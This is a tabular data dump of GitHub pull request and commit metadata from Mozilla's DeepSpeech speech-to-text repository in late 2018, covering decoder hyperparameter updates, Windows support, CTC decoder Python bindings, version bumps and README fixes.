2515,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1813,1813,Update README.md,Suggestion re this [previous post](https://discourse.mozilla.org/t/native-client-not-returning-output/34294/10) (location of generated native client binaries),william-vw,11859376,2019-01-01T22:22:24Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,371bdcc24ef82d01e26677a190198e2ab4f20365,Update README.md
2516,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1811,1811,Add lock bot config,"This config enables the [lock app](https://github.com/apps/lock) to lock inactive issues/PRs after they're closed an inactive for 30 days, hopefully helping to avoid necromancing of old threads in the repo. I'll ask for review after the holidays just to get approval from everyone.",reuben,477142,2018-12-28T21:38:38Z,MEMBER,True,38,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,39efa24d7dca8ffd42556211aa885b0795e1151e,Add lock bot config
2517,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1810,1810,Update decoder hyperparameters,"I'm gonna give it another try at embedding hyperparams in our models, as this PR should *really* not be this big.

Raw data from the runs is attached. Best results were with alpha=0.75, beta=1.85.

[runs_3311_3206.csv.txt](https://github.com/mozilla/DeepSpeech/files/2715602/runs_3311_3206.csv.txt)
[runs_3296_3273.csv.txt](https://github.com/mozilla/DeepSpeech/files/2715603/runs_3296_3273.csv.txt)
[runs_3295_3206.csv.txt](https://github.com/mozilla/DeepSpeech/files/2715604/runs_3295_3206.csv.txt)
",reuben,477142,2018-12-28T20:11:23Z,MEMBER,True,46,51,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa7cb1a983c031042ca2da73cb782deb2d0aad6b,Update decoder hyperparameters
2518,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1810,1810,Update decoder hyperparameters,"I'm gonna give it another try at embedding hyperparams in our models, as this PR should *really* not be this big.

Raw data from the runs is attached. Best results were with alpha=0.75, beta=1.85.

[runs_3311_3206.csv.txt](https://github.com/mozilla/DeepSpeech/files/2715602/runs_3311_3206.csv.txt)
[runs_3296_3273.csv.txt](https://github.com/mozilla/DeepSpeech/files/2715603/runs_3296_3273.csv.txt)
[runs_3295_3206.csv.txt](https://github.com/mozilla/DeepSpeech/files/2715604/runs_3295_3206.csv.txt)
",reuben,477142,2018-12-28T20:11:23Z,MEMBER,True,46,51,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c1315b1b7d9380104fe46ecf9d888d22a0aeb6f,Update prod tests expected output for new decoder hyperparameters
2519,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1802,1802,Fetch ds_ctcdecoder from VERSION-based URL by default,Fixes #1801,lissyx,1645737,2018-12-19T12:24:32Z,COLLABORATOR,True,37,2,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0e617ea6f1b91ebbbde09ac50755b1a2677c5e1d,"Fetch ds_ctcdecoder from VERSION-based URL by default

Fixes #1801"
2520,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1800,1800,Bump VERSION to 0.4.0-alpha.3,,lissyx,1645737,2018-12-19T09:23:50Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,24361c6a0d79087ef0172b12f5b655425f228cae,Bump VERSION to 0.4.0-alpha.3
2521,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1799,1799,Improve first user experience for CUDA deps,"Fixes #1798

X-DeepSpeech: NOBUILD",lissyx,1645737,2018-12-19T08:25:17Z,COLLABORATOR,True,13,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,924c144927cd0c6a14c7c63edf364dad4e05fe16,"Improve first user experience for CUDA deps

Fixes #1798

X-DeepSpeech: NOBUILD"
2522,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1792,1792,Windows support,,lissyx,1645737,2018-12-15T15:02:12Z,COLLABORATOR,False,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bca54d3f03a502ff7e6b67ed9a5a6aeab2d2bea8,Add OpenFST 1.6.9 Windows + README.mozilla
2523,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1792,1792,Windows support,,lissyx,1645737,2018-12-15T15:02:12Z,COLLABORATOR,False,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e7efb8c7a56c41130a3b5a290b8f4c5ad560ef82,Add cmath for Windows
2524,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1792,1792,Windows support,,lissyx,1645737,2018-12-15T15:02:12Z,COLLABORATOR,False,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1dc6cc490cc90f3e0876f45452e8b406965c9ad4,Add file access defines Windows
2525,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1792,1792,Windows support,,lissyx,1645737,2018-12-15T15:02:12Z,COLLABORATOR,False,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,33f5b640e44986356662c74afb1abadc6ded62fe,Add CSharp client + examples
2526,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1792,1792,Windows support,,lissyx,1645737,2018-12-15T15:02:12Z,COLLABORATOR,False,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89cc31f9cec054e40f5ff7f9796e54f413290630,Add OpenFST selects Windows
2527,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1792,1792,Windows support,,lissyx,1645737,2018-12-15T15:02:12Z,COLLABORATOR,False,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,714673ed30e6447e38faa9fca36921fc9dea82d9,Export client definitions .NET
2528,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1792,1792,Windows support,,lissyx,1645737,2018-12-15T15:02:12Z,COLLABORATOR,False,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0fc4cf19b0090886127a26422ff9a006f5ad068f,Merge branch 'master' into master
2529,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1792,1792,Windows support,,lissyx,1645737,2018-12-15T15:02:12Z,COLLABORATOR,False,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d519b7559f526e50f7727d8b55dfa29278fa98ed,Add math defines Windows
2530,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1791,1791,Fix handling of Alphabet around evaluate.py,,reuben,477142,2018-12-15T12:00:15Z,MEMBER,True,6,10,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dd6938f7af41cce64492bc61f140635646766654,Fix handling of Alphabet around evaluate.py
2531,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1790,1790,Use final version of TensorFlow r1.12,,lissyx,1645737,2018-12-14T17:18:43Z,COLLABORATOR,True,4,4,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1b6ca78c39eda7840cfb39bafc549c9644da7be9,Use final version of TensorFlow r1.12
2532,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1789,1789,Move nc_asset_name to extra,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-12-14T09:55:39Z,COLLABORATOR,True,2,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,936504f7e095f8f78d66f2646320882edeb9ba88,"Move nc_asset_name to extra

X-DeepSpeech: NOBUILD"
2533,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1788,1788,Bump VERSION to 0.4.0-alpha.2,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-12-14T09:23:44Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a3cba069ff4f9fcb7cce350d75af318067c0603,"Bump VERSION to 0.4.0-alpha.2

X-DeepSpeech: NOBUILD"
2534,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1787,1787,Android upload,,lissyx,1645737,2018-12-14T09:19:29Z,COLLABORATOR,True,17,0,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,77a9a53634cf87b27d2ae25a06016abe41d94430,Define native_client asset upload name
2535,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1787,1787,Android upload,,lissyx,1645737,2018-12-14T09:19:29Z,COLLABORATOR,True,17,0,11,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,060b17bfef9f3491e5464045eb8266bb9325ecaf,"Handle GitHub upload of Android builds

X-DeepSpeech: NOBUILD"
2536,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb4551caa992992f8cc162fe6d540f72c179b62a,Extend Python Alphabet with config file and decode method
2537,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,440893c58d668cc0d975c48b5fc3971feaf9c7c3,"Simplify ctcdecode API signatures to avoid nested STL structures

Flatten structure to avoid nested STL structures which are awkward to
wrap with SWIG and slower at runtime."
2538,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f5e7dfc4b737fe13f3d2479f9acc1a9c760679ad,Add Python/NumPy bindings to ctcdecode
2539,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1d55c9451240916bd2dda6d87292d38e67976051,Compute correct features length in preprocess.py
2540,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a9e1ffc0fc342841c11d1c094f01ae1edb4faed6,Use ctcdecode bindings in evaluate.py
2541,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d6642da05baa2a461ef0943d1ccaa2cdfd91c7ba,Fix typo exporting the wrong tensor for TFLite model
2542,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b022f02f26eb33a043cb85332448de281d512e39,"Merge pull request #1713 from lissyx/fix-tflite-export-states

Fix typo exporting the wrong tensor for TFLite model"
2543,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a8f88d9227be974a904f9dde25670c728204e96,"added error message to text.py when the transcripts and alphabet.txt file dont match, and a file to find the unique character set from the {train/dev/test} csv files"
2544,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7144e1d387532a2323e5dd3a7bfdeda79a0b63c,Address review comments
2545,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,eee92c232d1813965269f24648af3ff083c0b36a,"Merge pull request #1693 from mozilla/ctcdecode-python

Expose ctcdecode to Python and use it in evaluate.py"
2546,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3255f2342685af2602ac156b836ce05d944b5455,ctcdecode binding fixes
2547,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cc2d9f427d0ccb0a0f8919e7d5cb530c1cd7c9d5,"Remove training tests with deepspeech package

The presence of the package no longer influences training."
2548,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a0333728ebcbe7a9f6fa2a22b3d9587e139a32df,Build decoder package in automation
2549,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53e3e1212bcf75c5bbe389c5d533e2acfe2731fa,Remove old CTC decoder code
2550,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,60fb5ad04c8a070c8db4c03313a089921ffb566f,Remove old versions of decoder binary files
2551,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c274d4f62990519b4ffb8a8de288c4003262605,"reubens comments, kept newlines because prettier"
2552,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,56dc024d295f386b218def789f16187f2e808f85,"Centralize WER report code into evaluate.py, call it from DeepSpeech.py"
2553,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4d05c9af464fba17326d7651434088ae5c8a0478,Address review comments
2554,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,76e81f34ff41db57c1ab79ac022d342ff5ba37d5,"Merge pull request #1715 from JRMeyer/check-alphabet

Check for transcript & alphabet mis-match"
2555,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,38b54479a9ee0941994b4bedf822ad208e1b97f8,Add documentation and remove unneeded build of decoder packages
2556,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c65c22fe313eafde12c313fcb409e6a51817ce82,Move globals handling out of util/coordinator.py
2557,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9fc6c3f59bcc21a11653245a90c7689a764116cc,"Fix log issue

Very minor change in order to log something like 
``No directory ""/home/<user>/src/mozilla/cv_corpus_v1"" - extracting archive...`` instead of 
``No directory ""/home/<user>/src/mozilla/cv_corpus_v1.tar.gz"""
2558,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2ba5ba607fd883515ebb20535a010e314ba8c448,"Merge pull request #1719 from celian-garcia/patch-1

Fix minor log issue on bin/import_cv.py"
2559,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a5bcecbe404b9ee2128ae80d0f07336c55c7cdf8,Address more review comments
2560,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5cb1aff5313fddc936305c10ade6eaa867e624b3,Rename config singleton from C to Config
2561,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0dcb1f87c59263a07b1836a39824badeb71a9719,Clean up evaluate.py
2562,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfed8ccd4f4cfca41a008a1c1967d01ecd64f849,Cache common objects in decoder build
2563,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d125acfb3dad06e079585ffb7fbc6b352cdf63c0,"Merge pull request #1696 from mozilla/remove-old-ctc

Remove old CTC decoder (Fixes #1675)"
2564,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bbd6ea73ea16dc3beba7981666891d6cdd39c34f,Build OSX ds_ctcdecoder in separate task
2565,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1783,1783,Update tf master,,lissyx,1645737,2018-12-13T18:52:04Z,COLLABORATOR,True,8027,14818,237,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,17b7cddaba71a7e28398ac060a99c5ad26b09005,Run CTC Decoder build on merge and expose artifacts
2566,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1781,1781,Fix prod tests expected output with new feature computation,,reuben,477142,2018-12-12T14:06:38Z,MEMBER,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1379c7c102bc4502a174592209225e2d808d252b,Fix prod tests expected output with new feature computation
2567,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1780,1780,Set graph's random seed when training,,reuben,477142,2018-12-11T23:49:33Z,MEMBER,True,2,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8ebfe80dd4ebc9773b77235ebcda514c66bd7543,Set graph's random seed when training
2568,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1780,1780,Set graph's random seed when training,,reuben,477142,2018-12-11T23:49:33Z,MEMBER,True,2,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9ae2e5b3b2261a267faae8764f3c917ba2893f90,Use a random seed that overfits LDC93S1 in 75 epochs
2569,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1779,1779,Add missing upload_targets field,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-12-11T13:26:59Z,COLLABORATOR,True,4,3,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c887010a7781b7c1745c0dab781dd0cbfa3d25fa,"Add missing upload_targets field

X-DeepSpeech: NOBUILD"
2570,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1778,1778,Bump VERSION to 0.4.0-alpha.1,X-DeepSpeech: NOBUILD,lissyx,1645737,2018-12-11T13:05:14Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9190b1c66517e32c52ec871e2e58b018f3f25071,"Bump VERSION to 0.4.0-alpha.1

X-DeepSpeech: NOBUILD"
2571,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1777,1777,Split package upload,,lissyx,1645737,2018-12-11T12:35:49Z,COLLABORATOR,True,60,4,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ff5d58b2810bffd5caef5c59446e315aff100358,Split package upload
2572,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1776,1776,Update libssl deb,,lissyx,1645737,2018-12-11T09:53:58Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,94865e3b89d3bf1bb7b2a968ed06b0ab36f8beec,Update libssl deb
2573,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1775,1775,Update libssl deb,,lissyx,1645737,2018-12-11T09:52:01Z,COLLABORATOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,42e1a9bfc37554cc01f981717200590e0ce8ee7b,Update libssl deb
2574,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1773,1773,Use longer MFCC step instead of throwing away features (Fixes #1744),,reuben,477142,2018-12-10T13:09:45Z,MEMBER,True,27,25,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1df9602c954ba83e88d61cb8aeb07d8ed1169305,Use longer MFCC step instead of throwing away features.
2575,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1771,1771,Update README for examples/mic_vad_streaming,add note for MacOS users how to install portaudio,shershen08,1363772,2018-12-08T18:46:28Z,CONTRIBUTOR,True,6,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f9a70a1b2959317bab2fa0804c59d44376264cd0,"Update README.md

add note for MacOS users how to install portaudio"
2576,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1763,1763,"#1762: Update README.md To get a command line options, Should be --helpfull not --help ","PR: #1762: Update README.md To get a command line options, Should be --helpfull not --help ",nullbyte91,24765915,2018-12-04T13:33:45Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b0ec51c5dd207c433dd9883ba33c028ccffa64c,"#1762: Update README.md To get a command line options, Should be --helpfull not --help"
2577,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1761,1761,Add example for Nodejs streaming from arbitrary source with VAD and FFmpeg,"Tested with local file, RTMP and RTP source. Especially helpful to test real time inference scenarios.",igorfritzsch,7942067,2018-12-03T12:10:39Z,CONTRIBUTOR,True,163,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f869862f850d8939589b0d1bc045fe850bddb21d,Add index.js
2578,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1761,1761,Add example for Nodejs streaming from arbitrary source with VAD and FFmpeg,"Tested with local file, RTMP and RTP source. Especially helpful to test real time inference scenarios.",igorfritzsch,7942067,2018-12-03T12:10:39Z,CONTRIBUTOR,True,163,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,52d262c3677233867280cf8e461b264425afc26a,Add package.json
2579,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1761,1761,Add example for Nodejs streaming from arbitrary source with VAD and FFmpeg,"Tested with local file, RTMP and RTP source. Especially helpful to test real time inference scenarios.",igorfritzsch,7942067,2018-12-03T12:10:39Z,CONTRIBUTOR,True,163,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f3c48c42802b11f58322b20eca564d693b79e0d,Create README.MD
2580,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1760,1760,Character checking: be more verbose if something fails,This way one can easily debug what file causes problems,engelmohr,2565120,2018-12-03T11:09:29Z,CONTRIBUTOR,True,8,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,18ef670b05a58bf474c3c78097c4f8acfd737188,"Character checking: be more verbose if something fails

This way one can easily debug what file causes problems"
2581,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1758,1758,Support for Windows,"I'm still editing the docs, preparing for CUDA, and finishing the C# examples.

IMPORTANT NOTE: Did not try to train on Windows yet, my initial goal is to enable inference with the clients on Windows.  
Thanks to @reuben and @lissyx, they helped me a lot.

Fixes #1123 ",carlfm01,32177100,2018-11-30T03:49:08Z,COLLABORATOR,True,209884,15,556,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bca54d3f03a502ff7e6b67ed9a5a6aeab2d2bea8,Add OpenFST 1.6.9 Windows + README.mozilla
